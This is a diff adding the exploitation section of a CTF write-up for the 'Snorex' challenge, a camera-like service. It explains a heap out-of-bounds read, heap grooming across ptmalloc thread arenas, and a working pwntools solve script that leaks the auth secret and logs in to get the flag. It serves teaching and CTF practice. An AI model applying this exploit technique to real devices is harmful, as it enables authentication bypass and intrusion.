@@ -1298,7 +1298,7 @@ int __cdecl handle_iq(uint32_t cmd, uint8_t *buf, uint32_t len, int fd)
 - Allocates a memory of type `MI_IQ_CONTEXT` which is `256` bytes
 - Does some variable initialization such as setting the `heap_ptr` to the context memory, the maximum length and current length
 
-After that, function *MI_IQSERVER_GetApi* is called:
+After that, function `MI_IQSERVER_GetApi` is called:
 
 ```c
 void __cdecl MI_IQSERVER_GetApi(uint8_t *in_data, uint32_t in_length, MI_IQ_BUFFER *out)
@@ -1340,7 +1340,7 @@ void __cdecl MI_IQSERVER_GetApi(uint8_t *in_data, uint32_t in_length, MI_IQ_BUFF
 The parameters of this function are:
 - our input data
 - the size specified
-- a pointer to the *MI_IQ_BUFFER* structure
+- a pointer to the `MI_IQ_BUFFER` structure
 
 Basic checks are done to ensure all required data are set, and it also checks if the protocol identifier (the lower `word` of `in_data` converted to `big-endian`) equals `0x2803`.
 
@@ -1348,7 +1348,7 @@ Next it gets the `max_word` and multiplies by `4` and if it's greater than `0x40
 
 It updates `out->curr_length` to `raw_len` and then setups some header stuffs.
 
-Going back to the caller function *handle_iq*:
+Going back to the caller function `handle_iq`:
 
 ```c
  hdr[0] = htonl(0);
@@ -1583,3 +1583,386 @@ Analysing the reset handle_auth case (i.e cmd == 0):
 - Then it updates the `g_usr_ctx.encrypt_data` field to the new `encrypt_str`, and frees the previous `encrypt_str`
 - Finally writes 8 null bytes to our client fd
 
+#### Vulnerability
+
+The vulnerability here is simply a `Heap Out-of-Bands (OOB) Read`.
+
+During `handle_iq`, specifically here:
+
+```c
+write_full(fd, ctx, out.curr_length)
+```
+
+It writes up to `out.curr_length` which can be at most `0x400` bytes:
+
+```c
+    max_word = _byteswap_ushort(*((_WORD *)in_data + 1));
+    raw_len = 4 * (max_word + 2);
+    if ( raw_len > 0x400 )
+      raw_len = 1024;
+    out->curr_length = raw_len;
+```
+
+But the allocated memory of `ctx` is just `0x100` bytes:
+
+```c
+ctx = (MI_IQ_CONTEXT *)malloc(0x100uLL);
+```
+
+#### Exploitation
+
+Now we know the vuln, what can we do with it?
+
+Our goal is very obvious, we need to get authenticated in order to get the flag,
+
+And getting authenticated requires knowing the `encrypt_str` value, of course we can generate some of the data since we know serial, mac, timestamp.
+
+But the main issue is the random hex string.
+
+Leveraging the oob heap read we can dump the content of adjacent heap chunks, but really there's nothing of interest there.
+
+The reason is because the `encrypt_str` value is stored on the main heap thread (main arena) and because this uses the `ptmalloc` allocator this means every thread has it's own heap.
+
+We can easily confirm this from debugging.
+
+This is the state of the heap on initialization:
+
+```bash
+gef> vis -n
+0x55555555a000|+0x00000|+0x00000: 0x0000000000000000 0x0000000000000291 | ................ |
+0x55555555a010|+0x00010|+0x00010: 0x0000000000000000 0x0000000000000000 | ................ |
+* 39 lines, 0x270 bytes
+0x55555555a290|+0x00000|+0x00290: 0x0000000000000000 0x0000000000000111 | ................ |
+0x55555555a2a0|+0x00010|+0x002a0: 0x00315845524f4e53 0x2d5a454b41460a31 | SNOREX1.1.FAKEZ- |
+0x55555555a2b0|+0x00020|+0x002b0: 0x31304d41432d4b32 0x383133363637310a | 2K-CAM01.1766318 |
+0x55555555a2c0|+0x00030|+0x002c0: 0x3a42410a0a373532 0x43373a44343a3231 | 257..AB:12:4D:7C |
+0x55555555a2d0|+0x00040|+0x002d0: 0x330a30313a30323a 0x3530613636366264 | :20:10.3db666a05 |
+0x55555555a2e0|+0x00050|+0x002e0: 0x3230646664353832 0x3734303463666639 | 285dfd029ffc4047 |
+0x55555555a2f0|+0x00060|+0x002f0: 0x00000a3334633135 0x0000000000000000 | 51c43........... |
+0x55555555a300|+0x00070|+0x00300: 0x0000000000000000 0x0000000000000000 | ................ |
+* 9 lines, 0x90 bytes
+0x55555555a3a0|+0x00000|+0x003a0: 0x0000000000000000 0x0000000000000121 | ........!....... |
+0x55555555a3b0|+0x00010|+0x003b0: 0x000000000000000f 0x0000000000000000 | ................ |
+0x55555555a3c0|+0x00020|+0x003c0: 0x0000000000000001 0x0000000000000000 | ................ |
+0x55555555a3d0|+0x00030|+0x003d0: 0x00007ffff7600638 0x0000000000000000 | 8.`............. |
+0x55555555a3e0|+0x00040|+0x003e0: 0x0000000000000000 0x0000000000000000 | ................ |
+* 13 lines, 0xd0 bytes
+0x55555555a4c0|+0x00000|+0x004c0: 0x0000000000000000 0x0000000000020b41 | ........A....... |  <-  top
+0x55555555a4d0|+0x00010|+0x004d0: 0x0000000000000000 0x0000000000000000 | ................ |
+* 8370 lines, 0x20b20 bytes
+gef>
+```
+
+Now, when we try to dump some contents this is what happens:
+
+<div align="center">
+  <img src="dump_1.png" alt="dump 1" width="500">
+  <br>
+    <em>Sample dump of memory</em>
+</div>
+
+Of course `gdb` shows that a new thread is created:
+
+```bash
+gef> c
+Continuing.
+[New Thread 0x7ffff6c006c0 (LWP 153807)]
+[Thread 0x7ffff6c006c0 (LWP 153807) exited]
+^C
+```
+
+Taking a look at the heap we see nothing new:
+
+```bash
+gef> vis -n
+0x55555555a000|+0x00000|+0x00000: 0x0000000000000000 0x0000000000000291 | ................ |
+0x55555555a010|+0x00010|+0x00010: 0x0000000000000000 0x0000000000000000 | ................ |
+* 39 lines, 0x270 bytes
+0x55555555a290|+0x00000|+0x00290: 0x0000000000000000 0x0000000000000111 | ................ |
+0x55555555a2a0|+0x00010|+0x002a0: 0x00315845524f4e53 0x2d5a454b41460a31 | SNOREX1.1.FAKEZ- |
+0x55555555a2b0|+0x00020|+0x002b0: 0x31304d41432d4b32 0x383133363637310a | 2K-CAM01.1766318 |
+0x55555555a2c0|+0x00030|+0x002c0: 0x3a42410a0a373532 0x43373a44343a3231 | 257..AB:12:4D:7C |
+0x55555555a2d0|+0x00040|+0x002d0: 0x330a30313a30323a 0x3530613636366264 | :20:10.3db666a05 |
+0x55555555a2e0|+0x00050|+0x002e0: 0x3230646664353832 0x3734303463666639 | 285dfd029ffc4047 |
+0x55555555a2f0|+0x00060|+0x002f0: 0x00000a3334633135 0x0000000000000000 | 51c43........... |
+0x55555555a300|+0x00070|+0x00300: 0x0000000000000000 0x0000000000000000 | ................ |
+* 9 lines, 0x90 bytes
+0x55555555a3a0|+0x00000|+0x003a0: 0x0000000000000000 0x0000000000000121 | ........!....... |
+0x55555555a3b0|+0x00010|+0x003b0: 0x000000000000000f 0x0000000000000000 | ................ |
+0x55555555a3c0|+0x00020|+0x003c0: 0x0000000000000001 0x0000000000000000 | ................ |
+0x55555555a3d0|+0x00030|+0x003d0: 0x00007ffff7600638 0x0000000000000000 | 8.`............. |
+0x55555555a3e0|+0x00040|+0x003e0: 0x0000000000000000 0x0000000000000000 | ................ |
+* 13 lines, 0xd0 bytes
+0x55555555a4c0|+0x00000|+0x004c0: 0x0000000000000000 0x0000000000020b41 | ........A....... |  <-  top
+0x55555555a4d0|+0x00010|+0x004d0: 0x0000000000000000 0x0000000000000000 | ................ |
+* 8370 lines, 0x20b20 bytes
+gef>
+```
+
+But for sure we know that the `handle_client` does some heap manipulations.
+
+In order to identify the heap of any thread we can read the `main_arena.next` field (this is a doubly linked list that points to the arena of various threads)
+
+```bash
+gef> p main_arena.next
+$1 = (struct malloc_state *) 0x7fffe8000030
+gef>
+```
+
+Now we can dump the heap for that arena:
+
+```bash
+gef> p main_arena.next
+$1 = (struct malloc_state *) 0x7fffe8000030
+gef> vis -a 0x7fffe8000030 -n
+0x7fffe80008d0|+0x00000|+0x00000: 0x0000000000000000 0x0000000000000295 | ................ |
+0x7fffe80008e0|+0x00010|+0x00010: 0x0000000000000000 0x0000000000000000 | ................ |
+* 39 lines, 0x270 bytes
+0x7fffe8000b60|+0x00000|+0x00290: 0x0000000000000000 0x0000000000000115 | ................ |
+0x7fffe8000b70|+0x00010|+0x002a0: 0x00007fffe8000190 0x00007fffe8000190 | ................ |
+0x7fffe8000b80|+0x00020|+0x002b0: 0x4141414141414141 0x4141414141414141 | AAAAAAAAAAAAAAAA |
+* 14 lines, 0xe0 bytes
+0x7fffe8000c70|+0x00000|+0x003a0: 0x0000000000000110 0x0000000000020391 | ................ |  <-  top
+0x7fffe8000c80|+0x00010|+0x003b0: 0x00000007fffe8000 0xb5a77b7045543dd6 | .........=TEp{.. |
+0x7fffe8000c90|+0x00020|+0x003c0: 0x8ce1476911220000 0x9f9e9d9c9b9a9998 | ..".iG.......... |
+...
+gef>
+```
+
+Cool, we see our user data, but really there's nothing else interesting there..
+
+So how to we leverage this vulnerability?
+
+Recall that we can reset the `encrypt_str` value:
+
+```c
+    d = usrMgr_getEncryptDataStr();
+    if ( d )
+    {
+      pthread_mutex_lock(&g_usr_mutex);
+      old = g_usr_ctx.encrypt_data;
+      g_usr_ctx.encrypt_data = d;
+      pthread_mutex_unlock(&g_usr_mutex);
+      if ( old )
+        free(old);
+      hdr[0] = htonl(0);
+      hdr[1] = htonl(0);
+      return write_full(fd, hdr, 8uLL);
+    }
+  ```
+
+When this generates a new `d`, that is done in the current thread and then it updates `g_usr_ctx.encrypt_data` to the `d`, and since this is a global shared memory this means even if we create a new thread the authentication is going to make use of the value in `g_usr_ctx.encrypt_data`
+
+Essentially any allocations done in this thread is going to make use of the current heap thread and not the main thread.
+
+So we can make use of this feature to leak the generated pin.
+
+But how? In order to do that, the heap needs to groomed making it such that when it dumps, it would as well print the `encrypt_str` value.
+
+This is how the allocations are done:
+
+```bash
+handle_request:
+  - buf = malloc(len)
+
+  handle-iq:
+    - ctx = malloc(0x100)
+    - free(ctx)
+  
+  handle_auth:
+    - reset encrypted data:
+      - malloc(0x108)
+
+  - free(buf)
+```
+
+Basically we need to make the heap in this state:
+
+```
+--- [ctx struct] 
+--- [encrypt_str]
+```
+
+This way, when we dump `ctx` we would leak `encrypt_str`
+
+To do that, first I allocated a chunk of size `0x100` then used the `handle-iq` handler.
+
+Doing that would give us this:
+
+```bash
+gef> p main_arena.next
+$6 = (struct malloc_state *) 0x7fffe8000030
+gef> vis -a 0x7fffe8000030 -n
+0x7fffe80008d0|+0x00000|+0x00000: 0x0000000000000000 0x0000000000000295 | ................ |
+0x7fffe80008e0|+0x00010|+0x00010: 0x0000000000000000 0x0000000000000000 | ................ |
+0x7fffe80008f0|+0x00020|+0x00020: 0x0000000000000000 0x0002000000000000 | ................ |
+0x7fffe8000900|+0x00030|+0x00030: 0x0000000000000000 0x0000000000000000 | ................ |
+* 12 lines, 0xc0 bytes
+0x7fffe80009d0|+0x00100|+0x00100: 0x0000000000000000 0x00007fffe8000b70 | ........p....... |
+0x7fffe80009e0|+0x00110|+0x00110: 0x0000000000000000 0x0000000000000000 | ................ |
+* 23 lines, 0x170 bytes
+0x7fffe8000b60|+0x00000|+0x00290: 0x0000000000000000 0x0000000000000115 | ................ |
+0x7fffe8000b70|+0x00010|+0x002a0: 0x00007ff817fe8c80 0xb5a77b7045543dd6 | .........=TEp{.. |  <-  tcache[idx=15,sz=0x110][1/2]                                                               
+0x7fffe8000b80|+0x00020|+0x002b0: 0x4141414141414141 0x4141414141414141 | AAAAAAAAAAAAAAAA |                                                                                                 
+* 14 lines, 0xe0 bytes
+0x7fffe8000c70|+0x00000|+0x003a0: 0x0000000000000110 0x0000000000000115 | ................ |
+0x7fffe8000c80|+0x00010|+0x003b0: 0x00000007fffe8000 0xb5a77b7045543dd6 | .........=TEp{.. |  <-  tcache[idx=15,sz=0x110][2/2]
+0x7fffe8000c90|+0x00020|+0x003c0: 0x58e6476911220000 0x9f9e9d9c9b9a9998 | ..".iG.X........ |
+0x7fffe8000ca0|+0x00030|+0x003d0: 0x8786858483828180 0x8f8e8d8c8b8a8988 | ................ |
+0x7fffe8000cb0|+0x00040|+0x003e0: 0x9796959493929190 0x9f9e9d9c9b9a9998 | ................ |
+0x7fffe8000cc0|+0x00050|+0x003f0: 0x1caf2d3a65c34d71 0x7b24b18150d3c2e2 | qM.e:-.....P..${ |
+0x7fffe8000cd0|+0x00060|+0x00400: 0x2906bfa7cc7ff990 0x8f0c031e3541c4ca | .......)..A5.... |
+0x7fffe8000ce0|+0x00070|+0x00410: 0xdea7a4fc8af5cf50 0xbc63532be72f7a66 | P.......fz/.+Sc. |
+0x7fffe8000cf0|+0x00080|+0x00420: 0x6c1d8ea2f488e24d 0xb100ad6170a15e52 | M......lR^.pa... |
+0x7fffe8000d00|+0x00090|+0x00430: 0x0058e399793cf57d 0x27454ada89e7875d | }.<y..X.]....JE' |
+0x7fffe8000d10|+0x000a0|+0x00440: 0xae3b385bcf1bcd2d 0x07a91e8af71edc96 | -...[8;......... |
+0x7fffe8000d20|+0x000b0|+0x00450: 0x25add8c8ad80e513 0x0c61f3df3aae945f | .......%_..:..a. |
+0x7fffe8000d30|+0x000c0|+0x00460: 0x4cca16b51cdb7dc0 0x1a83ec077c43e8f2 | .}.....L..C|.... |
+0x7fffe8000d40|+0x000d0|+0x00470: 0x3cbf74dc99c704d1 0x21f4d761e8766d09 | .....t.<.mv.a..! |
+0x7fffe8000d50|+0x000e0|+0x00480: 0xd75607e50a3dcf54 0x5711d786f75499f0 | T.=...V...T....W |
+0x7fffe8000d60|+0x000f0|+0x00490: 0x56f4b04db8f1d9db 0x96a032417e3e6a1d | ....M..V.j>~A2.. |
+0x7fffe8000d70|+0x00100|+0x004a0: 0xd5bef6e5e6a0dd01 0xc56ddde915cc128f | ..............m. |
+0x7fffe8000d80|+0x00000|+0x004b0: 0x0000000000000000 0x0000000000020281 | ................ |  <-  top
+0x7fffe8000d90|+0x00010|+0x004c0: 0x0000000000000000 0x0000000000000000 | ................ |
+* 8230 lines, 0x20260 bytes
+gef>
+```
+
+Since the chunks are of the same size and are in the tcache-bin, any future allocations of this size index would be collected from the tcache-bin.
+
+Next thing I did was to allocate another chunk of size `0x100` and use the reset handler, here's the state of the heap:
+
+```bash
+gef> vis -a 0x7fffe8000030 -n
+0x7fffe80008d0|+0x00000|+0x00000: 0x0000000000000000 0x0000000000000295 | ................ |
+0x7fffe80008e0|+0x00010|+0x00010: 0x0000000000000000 0x0000000000000000 | ................ |
+0x7fffe80008f0|+0x00020|+0x00020: 0x0000000000000000 0x0002000000000000 | ................ |
+0x7fffe8000900|+0x00030|+0x00030: 0x0000000000000000 0x0000000000000000 | ................ |
+* 12 lines, 0xc0 bytes
+0x7fffe80009d0|+0x00100|+0x00100: 0x0000000000000000 0x00007fffe8000b70 | ........p....... |
+0x7fffe80009e0|+0x00110|+0x00110: 0x0000000000000000 0x0000000000000000 | ................ |
+* 23 lines, 0x170 bytes
+0x7fffe8000b60|+0x00000|+0x00290: 0x0000000000000000 0x0000000000000115 | ................ |
+0x7fffe8000b70|+0x00010|+0x002a0: 0x00005552aaab22a0 0xb5a77b7045543dd6 | ."..RU...=TEp{.. |  <-  tcache[idx=15,sz=0x110][1/2]
+0x7fffe8000b80|+0x00020|+0x002b0: 0x4141414141414141 0x4141414141414141 | AAAAAAAAAAAAAAAA |
+* 14 lines, 0xe0 bytes
+0x7fffe8000c70|+0x00000|+0x003a0: 0x0000000000000110 0x0000000000000115 | ................ |
+0x7fffe8000c80|+0x00010|+0x003b0: 0x00315845524f4e53 0x2d5a454b41460a31 | SNOREX1.1.FAKEZ- |
+0x7fffe8000c90|+0x00020|+0x003c0: 0x31304d41432d4b32 0x393133363637310a | 2K-CAM01.1766319 |
+0x7fffe8000ca0|+0x00030|+0x003d0: 0x3a42410a0a303639 0x43373a44343a3231 | 960..AB:12:4D:7C |
+0x7fffe8000cb0|+0x00040|+0x003e0: 0x360a30313a30323a 0x3061666131666138 | :20:10.68af1afa0 |
+0x7fffe8000cc0|+0x00050|+0x003f0: 0x6264363434376134 0x3639373561623033 | 4a7446db30ba5796 |
+0x7fffe8000cd0|+0x00060|+0x00400: 0x00000a3332343837 0x0000000000000000 | 78423........... |
+0x7fffe8000ce0|+0x00070|+0x00410: 0x0000000000000000 0x0000000000000000 | ................ |
+* 9 lines, 0x90 bytes
+0x7fffe8000d80|+0x00000|+0x004b0: 0x0000000000000000 0x0000000000020281 | ................ |  <-  top
+0x7fffe8000d90|+0x00010|+0x004c0: 0x0000000000000000 0x0000000000000000 | ................ |
+* 8230 lines, 0x20260 bytes
+gef>
+```
+
+Looking at it, we can see a freed tcache bin at the top of the `encrypt_str` memory.
+
+Now if we allocate a size of `0x100` that would give us `0x7fffe8000b70` but because `ctx` is also of size `0x108` that would make allocation from the top chunk which is going to be below `encrypt_str`.
+
+To go around this, we simply allocate a chunk of larger size in my case i used `0x200`, this means it is going to be gotten from the top chunk and then `ctx` from the tcache leading us to leak `encrypt_str`.
+
+Now with that we can leak the values, generated the expected auth code and get the flag.
+
+Here's my solve script:
+
+```python
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+from pwn import *
+import hashlib
+
+#host, port = "129.212.160.155", 50075
+host, port = "localhost", 3500
+
+def htonl(hostlong):
+    return struct.pack("!I", hostlong)
+
+def handleDump(LEN, DATA):
+    IQ_CMD = 0x6
+    PROTO_HDR = 0x328
+    PROTO_SIZE = 0x1122
+    HEADER = htonl(IQ_CMD) + htonl(LEN) + p16(PROTO_HDR) + p16(PROTO_SIZE) + DATA
+    return HEADER
+
+def handleAuthReset(LEN, DATA):
+    RESET_CMD = 0x0
+    HEADER = htonl(RESET_CMD) + htonl(LEN) + DATA
+    return HEADER
+
+def handleAuthConn(auth):
+    AUTH_CMD = 0x1
+    HEADER = htonl(AUTH_CMD) + htonl(len(auth)) + auth.encode()
+    return HEADER
+
+def thread1():
+    p = remote(host, port)
+    proto  = handleDump(0x100, b"A"*(0x100 - 0x4))
+    proto += handleAuthReset(0x100, b"A"*0x100)
+    p.send(proto)
+    p.shutdown()
+
+def thread2():
+    p = remote(host, port)
+
+    proto = handleDump(0x200, b"A"*(0x200 - 0x4))
+    p.send(proto)
+
+    raw_string = p.recvlines(7)
+
+    cam = b"1\n"
+    cam += raw_string[-5]
+    cam += b"\n"
+    cam += raw_string[-4]
+    cam += b"\n\n"
+    cam += raw_string[-2]
+    cam += b"\n"
+    cam += raw_string[-1]
+    cam += b"\n"
+
+    auth_key = hashlib.md5(cam).hexdigest()
+
+    info(f"encrypted str: {cam}")
+    info(f"auth key: {auth_key}")
+
+    proto = handleAuthConn(auth_key)
+    p.send(proto)
+
+    p.interactive()
+
+
+def main():
+
+    thread1()
+    thread2()
+
+
+if __name__ == "__main__":
+    main()
+```
+
+Running it works:
+
+
+```bash
+ ~/Desktop/CTF/NahamconWinter25/Snorex ❯ python3 solve.py
+[+] Opening connection to localhost on port 3500: Done
+[+] Opening connection to localhost on port 3500: Done
+[*] encrypted str: b'1\nFAKEZ-2K-CAM01\n1766320362\n\nAB:12:4D:7C:20:10\n60c3c42ea3d49e017358437a24aae3\n'
+[*] auth key: 82ac74dbc50d4a89fa832600915389a9
+[*] Switching to interactive mode
+\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x15\x02\x00\x00\x00\x00\x00\x00(\x03"\x11AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA$\x00\x00\x00\x00\x00\x00\x00&$
+flag{now_repeat_against_remote_server}
+[*] Interrupted
+[*] Closed connection to localhost port 3500
+[*] Closed connection to localhost port 3500
+```
+
+Note: The exploit is not fully stable and may require multiple runs to succeed.
+
+Adios 🫡
